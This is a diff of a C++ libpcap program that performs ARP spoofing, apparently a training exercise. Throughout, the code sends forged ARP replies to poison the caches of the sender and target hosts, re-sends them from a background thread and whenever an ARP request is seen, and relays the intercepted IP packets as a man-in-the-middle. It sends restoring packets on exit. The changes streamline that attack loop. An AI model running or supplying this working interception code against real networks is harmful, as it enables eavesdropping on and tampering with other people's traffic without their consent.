@@ -7,6 +7,7 @@
 #include "ip.h"
 #include<stdlib.h>
 #include <pthread.h>
+#include <unistd.h>
 #include <libnet.h>
 #include <netinet/in.h>
 #include <netinet/if_ether.h>
@@ -44,6 +45,7 @@ int chk_pck;
 int total_flow;
 Mac mac_address_mine, mac_address_sender, mac_address_target;
 Ip ip_address_mine;
+Ip sender_ip_list[MX], target_ip_list[MX];
 map <Ip, Mac> ip_mac;
 pcap_t* close_handle;
 map <find_which_query, int> find_order;
@@ -88,12 +90,11 @@ int main(int argc, char* argv[]) {
     signal(SIGINT, recovering_packet_send);
     finding_my_ip_address(dev);
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return -1;
     }
-    pcap_close(handle);
 
     int errmy=setting_my_mac();
     if(errmy==0){
@@ -142,7 +143,7 @@ int main(int argc, char* argv[]) {
     */
     for(int j=1;j<=tot_argc;j++){
         chk_pck=j;
-        printf("%dth case of sender and target arp spoofing started\n",j);
+        printf("%dth case of sender and target mac address finding started\n",j);
         in_addr addr_inet_sender;
         in_addr addr_inet_target;
         if(!inet_aton(argv[2*j], &addr_inet_sender)){
@@ -153,19 +154,23 @@ int main(int argc, char* argv[]) {
             printf("invalid IP address : %s\n", argv[2*j+1]);
             continue;;
         }
-        handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+
+        sender_ip_list[j]=addr_inet_sender.s_addr;
+        target_ip_list[j]=addr_inet_target.s_addr;
         send_arp_spoof(handle, dev, addr_inet_sender, addr_inet_target);
-        pcap_close(handle);
     }
-    printf("\narp spoofing stated!\n");
+    printf("\narp spoofing started!\n");
     //attacking_packet_send();
-    printf("\n---------------------------------------------------------------\nsending attacking packet\n");
+    //printf("\n---------------------------------------------------------------\nsending attacking packet\n");
+    close_handle=handle;
+    //recovering_packet_send(1);
+
+
+
     for(int j=1;j<=total_flow;j++){
-        pcap_t* handle_send = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-        pcap_sendpacket(handle_send, reinterpret_cast<const u_char*>(&(attacking_packet[j])), sizeof(EthArpPacket));
-        pcap_close(handle_send);
+        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(attacking_packet[j])), sizeof(EthArpPacket));
     }
-    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+
     close_handle=handle;
     make_thread_attacking();
     //start_thread_send_attacking_packet_3s();
@@ -176,7 +181,7 @@ int main(int argc, char* argv[]) {
         int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0){
             //pcap_close(handle);
-            //handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+            //handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
             continue;
         }
         if (res == -1 || res == -2) {
@@ -193,24 +198,30 @@ int main(int argc, char* argv[]) {
             if(arp_hdr.op_!=htons(ArpHdr::Request) || arp_hdr.hrd()!=(ArpHdr::ETHER)){
                 continue;//right op code(reply) and hardware type is ether;
             }
-            map <find_which_query, int>::iterator imsi3;
+            //map <find_which_query, int>::iterator imsi3;
             find_which_query imsiss;
             imsiss.sender=arp_hdr.sip_, imsiss.target=arp_hdr.tip_;
             char str1[INET_ADDRSTRLEN], str2[INET_ADDRSTRLEN];
             inet_ntop(AF_INET, &(imsiss.sender), str1, INET_ADDRSTRLEN);
             inet_ntop(AF_INET, &(imsiss.target), str2, INET_ADDRSTRLEN);
-            printf("---------------------------------------------------------------\n");
-            printf("arp request packet's sender ip  address!\t: %s\n", str1);
-            printf("arp request packet's target ip  address!\t: %s\n", str2);
+            //printf("---------------------------------------------------------------\n");
+            //printf("arp request packet's sender ip  address!\t: %s\n", str1);
+            //printf("arp request packet's target ip  address!\t: %s\n", str2);
+            for(i=1;i<=total_flow;i++){
+                if(imsiss.sender==target_ip_list[i] || imsiss.target == target_ip_list[i]){
+                    //printf("I will send arp-reply to (sender : %s, target : %s) pair\n", argv[2*i], argv[2*i+1]);
+                    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(attacking_packet[i])), sizeof(EthArpPacket));
+                }
+            }
+
+            /*
             imsi3=find_order.find(imsiss);
             if(imsi3==find_order.end()){
                 continue;
             }
-            pcap_t* handle_send = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-            pcap_sendpacket(handle_send, reinterpret_cast<const u_char*>(&(attacking_packet[imsi3->second])), sizeof(EthArpPacket));
-            pcap_close(handle_send);
+            */
 
-            printf("arp request packet that I received is %dth pair!\n", imsi3->second);
+            //printf("arp request packet that I received is %dth pair!\n", imsi3->second);
             //print_sender_mac_address();
         }
         else if(eth_header.type()==(EthHdr::Ip4)){
@@ -225,8 +236,8 @@ int main(int argc, char* argv[]) {
                 continue;
             }
             struct libnet_ipv4_hdr *packet_ip=(struct libnet_ipv4_hdr *)(packet + sizeof(EthHdr));
-            printf("IP version : %#02x\n", packet_ip->ip_v);
-            printf("IP protocol : %#02x\n", packet_ip->ip_p);
+            //printf("IP version : %#02x\n", packet_ip->ip_v);
+            //printf("IP protocol : %#02x\n", packet_ip->ip_p);
             Ip ip_packet_sender=packet_ip->ip_src.s_addr;
             Ip ip_packet_target=packet_ip->ip_dst.s_addr;
             char str1[INET_ADDRSTRLEN], str2[INET_ADDRSTRLEN];
@@ -281,36 +292,15 @@ int main(int argc, char* argv[]) {
             printf("IP header, total packet length : %d\n", total_packet_length);
             u_char* imsipacket=(u_char *)malloc(sizeof(u_char) * packetlength);
             //memcpy(imsipacket, packet, packetlength);
-            printf("Original packet that sender must send to target is like \n");
-
+            //printf("Original packet that sender must send to target is like \n");
             for(i=0;i<packetlength;i++){
                 imsipacket[i]=packet[i];
-                printf("%02x ", packet[i]);
-                if(i%16==15){
-                    printf("\n");
-                }
             }
-            printf("\n");
-            for(i=0;i<packetlength;i++){
-                printf("%02x ", imsipacket[i]);
-                if(i%16==15){
-                    printf("\n");
-                }
-            }
-            printf("\nspoofed packet that I will send is like \n");
+            //printf("\nspoofed packet that I will send is like \n");
             //printf("\nsizeofethheader %d %d\n",sizeofether, sizeof(eth_header));
             memcpy(imsipacket, &eth_header, sizeofether);
-
-            for(i=0;i<packetlength;i++){
-                printf("%02x ",imsipacket[i]);
-                if(i%16==15){
-                    printf("\n");
-                }
-            }
             printf("\nI'll relay sender's packet to target!\n");
-            pcap_t* handle_send = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-            pcap_sendpacket(handle_send, reinterpret_cast<const u_char*>(imsipacket), packetlength * sizeof(u_char));
-            pcap_close(handle_send);
+            pcap_sendpacket(handle, reinterpret_cast<const u_char*>(imsipacket), packetlength * sizeof(u_char));
         }
     }
     pcap_close(handle);
@@ -395,12 +385,13 @@ int send_arp_spoof(pcap_t* handle, char* dev,in_addr addr_inet_sender,in_addr ad
         }
         int kk=0;
         while(true){
+            usleep(100000);
+            pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_broadcast), sizeof(EthArpPacket));
             int i;
             struct pcap_pkthdr* header;
             const u_char* packet;
             int res = pcap_next_ex(handle, &header, &packet);
             if (res == 0){
-                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_broadcast), sizeof(EthArpPacket));
                 kk++;
                 if(kk==20){//prt's ip address is wrong!
                     printf("Failed to get %dth %s's mac address!\n",chk_pck,prt[typeofsenderortarget]);
@@ -427,22 +418,24 @@ int send_arp_spoof(pcap_t* handle, char* dev,in_addr addr_inet_sender,in_addr ad
             }
             //if this isn't reply
             //if request_arp's sender ip != reply_arp's target ip
-
+            /*
             if(request_arp.sip_.ip_!=reply_arp.tip_.ip_){
                 continue;
             }
-
+            */
             //if request_arp's target ip != reply_arp's senders ip address
             if(request_arp.tip_.ip_!=reply_arp.sip_.ip_){
                 continue;
             }
 
             //if request_arp's source mac == reply_arp's des mac
+            /*
             for(i=0;i<Mac::SIZE;i++){
                 if(request_arp.smac_[i]!=reply_arp.tmac_[i]){
                     continue;
                 }
             }
+            */
             for(i=0;i<Mac::SIZE;i++){
                 MAC_address[i]=reply_arp.smac_[i];
             }
@@ -487,9 +480,11 @@ int send_arp_spoof(pcap_t* handle, char* dev,in_addr addr_inet_sender,in_addr ad
     packet_real=make_spoofing_arp_reply_packet(addr_inet_sender.s_addr, addr_inet_target.s_addr, 1);
     attacking_packet[chk_pck]=packet_real;
     packet_real=make_spoofing_arp_reply_packet(addr_inet_sender.s_addr, addr_inet_target.s_addr, 2);
-    recovering_packet[(chk_pck*2)-1]=packet_real;
+    recovering_packet[chk_pck]=packet_real;
+    /*
     packet_real=make_spoofing_arp_reply_packet(addr_inet_sender.s_addr, addr_inet_target.s_addr, 3);
     recovering_packet[chk_pck*2]=packet_real;
+    */
     find_which_query imsi_query;
     imsi_query.sender=addr_inet_sender.s_addr;
     imsi_query.target=addr_inet_target.s_addr;
@@ -623,6 +618,7 @@ EthArpPacket make_spoofing_arp_reply_packet(Ip sender, Ip target, int typ){
         imsi.arp_.tmac_ = it->second;
         imsi.arp_.tip_  = sender;
     }
+    /*
     else if(typ==3){//target properly knows sender's mac address
         imsi.eth_.dmac_ = it2->second;
         imsi.arp_.smac_ = it->second;
@@ -630,39 +626,37 @@ EthArpPacket make_spoofing_arp_reply_packet(Ip sender, Ip target, int typ){
         imsi.arp_.tmac_ = it2->second;
         imsi.arp_.tip_  = target;
     }
+    */
     return imsi;
 }
 void recovering_packet_send(int sig){
     int i;
     make_thread_stop();//ctrl + C --> stop sending arp reply packet!
-    sleep(4);
-    char errbuf[PCAP_ERRBUF_SIZE];
     printf("\n---------------------------------------------------------------\nProgram will send recover arp reply packet and terminate!\n");
-    for(i=1;i<=2*total_flow;i++){
-        //printf("\n%d\n", i);
-        pcap_t* handle_send = pcap_open_live(dev_recover, BUFSIZ, 1, 1000, errbuf);
-        pcap_sendpacket(handle_send, reinterpret_cast<const u_char*>(&(recovering_packet[i])), sizeof(EthArpPacket));
-        pcap_close(handle_send);
+    for(int zz=0;zz<3;zz++){
+        sleep(1);
+        for(i=1;i<=total_flow;i++){
+            //printf("\n%d\n", i);
+            pcap_sendpacket(close_handle, reinterpret_cast<const u_char*>(&(recovering_packet[i])), sizeof(EthArpPacket));
+        }
+        printf("%dth recover packet send!\n",zz+1);
     }
     pcap_close(close_handle);
     exit(sig);
 }
 void attacking_packet_send(){
-    char errbuf[PCAP_ERRBUF_SIZE];
-    printf("\n---------------------------------------------------------------\nsending attacking packet\n");
+    //printf("\n---------------------------------------------------------------\nsending attacking packet\n");
     for(int j=1;j<=total_flow;j++){
-        pcap_t* handle_send = pcap_open_live(dev_recover, BUFSIZ, 1, 1000, errbuf);
-        pcap_sendpacket(handle_send, reinterpret_cast<const u_char*>(&(attacking_packet[j])), sizeof(EthArpPacket));
-        pcap_close(handle_send);
+        pcap_sendpacket(close_handle, reinterpret_cast<const u_char*>(&(attacking_packet[j])), sizeof(EthArpPacket));
     }
 }
 void* start_thread_send_attacking_packet_3s(void *arg){
     for(;;){
-        attacking_packet_send();
         if(thread_exit==true){
             break;
         }
-        sleep(3);
+        usleep(1000000);
+        attacking_packet_send();
     }
     pthread_exit((void*)0);
     return NULL;
